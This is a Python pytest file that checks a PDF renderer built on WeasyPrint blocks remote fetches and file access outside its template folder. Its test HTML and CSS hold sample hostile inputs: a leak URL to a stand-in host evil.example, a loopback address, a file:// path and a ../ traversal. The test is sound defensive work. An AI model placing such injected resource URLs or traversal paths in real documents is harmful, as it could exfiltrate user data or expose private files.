"""A render never reaches the network or a file outside its template: the documents will
carry model output, and a render runs before anyone has reviewed a draft."""

import urllib.request
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from jobingo.render.pdf import engine_available, render_pdf

pytestmark = pytest.mark.skipif(not engine_available(), reason="WeasyPrint needs Pango")


@pytest.fixture
def opened(monkeypatch: pytest.MonkeyPatch) -> Iterator[list[str]]:
    """Every URL WeasyPrint's fetcher actually opens (network or file)."""
    seen: list[str] = []
    real_open = urllib.request.OpenerDirector.open

    def spy(self: urllib.request.OpenerDirector, fullurl: Any, *args: Any, **kwargs: Any) -> Any:
        url = fullurl if isinstance(fullurl, str) else fullurl.full_url
        seen.append(url)
        if url.startswith(("http:", "https:")):
            raise AssertionError(f"network fetch attempted: {url}")
        return real_open(self, fullurl, *args, **kwargs)

    monkeypatch.setattr(urllib.request.OpenerDirector, "open", spy)
    yield seen


def test_remote_and_outside_resources_are_never_opened(tmp_path: Path, opened: list[str]):
    template_dir = tmp_path / "gabarit"
    template_dir.mkdir()
    outside = tmp_path / "secret.png"
    outside.write_bytes(b"not an image")
    html = (
        "<p>texte</p>"
        '<img src="https://evil.example/leak?q=cv">'
        '<img src="http://127.0.0.1:9/x.png">'
        f'<img src="file://{outside}">'
        '<img src="../secret.png">'
    )
    css = "@import url('https://evil.example/s.css'); p { color: black; }"

    pdf, _pages = render_pdf(html, css, template_dir)

    assert pdf.startswith(b"%PDF")
    assert not any("evil.example" in url or "127.0.0.1" in url for url in opened)
    assert not any("secret.png" in url for url in opened)


def test_a_template_asset_and_a_data_uri_still_load(tmp_path: Path, opened: list[str]):
    template_dir = tmp_path / "gabarit"
    template_dir.mkdir()
    (template_dir / "extra.css").write_text("p { color: #123456; }", encoding="utf-8")
    pixel = (
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4"
        "nGNgYGBgAAAABQABpfZFQAAAAABJRU5ErkJggg=="
    )

    render_pdf(f'<p>texte</p><img src="{pixel}">', "@import url('extra.css');", template_dir)

    assert any(url.endswith("gabarit/extra.css") for url in opened)
